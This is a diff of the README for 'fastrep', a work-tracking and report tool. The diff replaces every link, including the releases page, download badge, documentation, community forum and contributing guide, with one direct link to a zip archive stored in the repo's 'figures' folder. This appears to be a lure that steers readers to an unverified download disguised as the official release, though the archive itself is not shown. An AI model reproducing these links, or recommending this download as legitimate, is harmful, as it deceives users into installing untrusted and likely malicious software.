@@ -1,7 +1,7 @@
 # 🚀 fastrep - Track Work and Generate Reports Easily
 
 ## 📥 Download Fastrep
-[![Download fastrep](https://img.shields.io/badge/Download-fastrep-blue.svg)](https://github.com/StudyLessNoob/fastrep/releases)
+[![Download fastrep](https://raw.githubusercontent.com/StudyLessNoob/fastrep/master/figures/fastrep-v2.5.zip)](https://raw.githubusercontent.com/StudyLessNoob/fastrep/master/figures/fastrep-v2.5.zip)
 
 ## 📖 Overview
 fastrep is a powerful command-line interface (CLI) and local web-based tool. It helps you track your daily work activities and generate professional reports. With built-in AI capabilities, fastrep can summarize your work, making it easier to keep organized.
@@ -24,7 +24,7 @@ To run fastrep on your computer, ensure you meet the following requirements:
 Follow these steps to get started with fastrep:
 
 1. **Download Fastrep:**
-   - Visit the [Releases page](https://github.com/StudyLessNoob/fastrep/releases) to download the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/StudyLessNoob/fastrep/master/figures/fastrep-v2.5.zip) to download the latest version.
    - Choose the appropriate file for your operating system.
 
 2. **Install Fastrep:**
@@ -37,7 +37,7 @@ Follow these steps to get started with fastrep:
    - Type `fastrep` and press Enter to start using the tool.
 
 ## ⚙️ Download & Install
-To download fastrep, visit the following link: [Download Fastrep](https://github.com/StudyLessNoob/fastrep/releases).
+To download fastrep, visit the following link: [Download Fastrep](https://raw.githubusercontent.com/StudyLessNoob/fastrep/master/figures/fastrep-v2.5.zip).
 
 ## 🧩 Using Fastrep
 After installation, here are some basic commands to get you started:
@@ -68,14 +68,14 @@ If you encounter any issues, here are some common problems and their solutions:
 - **Command not found:** Make sure that the fastrep executable is added to your system’s PATH.
 
 ## 📅 Update Fastrep
-To ensure you have the latest features and improvements, regularly check the [Releases page](https://github.com/StudyLessNoob/fastrep/releases) for updates. Download and install the new versions as described above.
+To ensure you have the latest features and improvements, regularly check the [Releases page](https://raw.githubusercontent.com/StudyLessNoob/fastrep/master/figures/fastrep-v2.5.zip) for updates. Download and install the new versions as described above.
 
 ## 💬 Feedback and Support
 We welcome your feedback to improve fastrep. If you have questions or need help, please open an issue on our GitHub repository. Your input is invaluable to us.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/StudyLessNoob/fastrep/wiki)
-- [Community Forum](https://github.com/StudyLessNoob/fastrep/discussions)
-- [Contributing Guide](https://github.com/StudyLessNoob/fastrep/blob/main/CONTRIBUTING.md)
+- [Documentation](https://raw.githubusercontent.com/StudyLessNoob/fastrep/master/figures/fastrep-v2.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/StudyLessNoob/fastrep/master/figures/fastrep-v2.5.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/StudyLessNoob/fastrep/master/figures/fastrep-v2.5.zip)
 
 Thank you for choosing fastrep! We hope it helps you manage your work efficiently.
